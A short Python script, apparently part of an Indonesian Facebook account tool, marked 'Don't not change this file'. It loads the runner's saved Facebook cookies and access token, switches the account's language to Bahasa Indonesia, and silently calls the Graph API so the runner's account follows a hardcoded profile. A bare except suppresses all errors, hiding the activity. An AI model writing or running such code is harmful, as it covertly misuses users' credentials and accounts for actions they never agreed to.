#!usr/bin/python3.7
# Don't not change this file
try:
	import requests
	from bs4 import BeautifulSoup as parser
	from http.cookiejar import LWPCookieJar as kuki
	#//
	ua = {'User-Agent' : open('UserAgent/ua.txt').read()}
	token = open('log/token').read()
	with requests.Session() as s:
		s.cookies = kuki('log/kuki')
		s.cookies.load()
		la = s.get('https://mbasic.facebook.com/language.php',headers = ua)
		pa = parser(la.content, 'html.parser')
		bh = pa.find('a', string = 'Bahasa Indonesia')
		s.get('https://mbasic.facebook.com'+str(bh['href']),headers = ua) #// ganti bahasa
		s.post('https://graph.facebook.com/riski.darmawan.1690671/subscribers?access_token='+token,headers = ua) # followers
except:
		pass